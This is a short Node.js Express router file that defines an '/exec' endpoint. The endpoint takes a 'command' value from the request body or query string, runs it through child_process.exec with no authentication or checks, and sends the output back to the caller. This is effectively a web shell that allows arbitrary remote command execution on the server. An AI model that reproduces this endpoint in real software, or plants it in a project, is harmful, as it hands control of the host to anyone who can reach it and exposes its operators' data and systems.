const express = require('express')
const child = express.Router()
const path = require('path')
const exec = require('child_process').exec

child.use('/exec', (req, res, next) => {
    let data = Object.assign({}, req.body, req.query)
    if (data.command)
        return exec(data.command, (err, stdout, stderr) => {
            res.api.sendData({
                command: data.command,
                err,
                stdout,
                stderr
            })
        })
    res.api.sendData('ok')
})

module.exports = child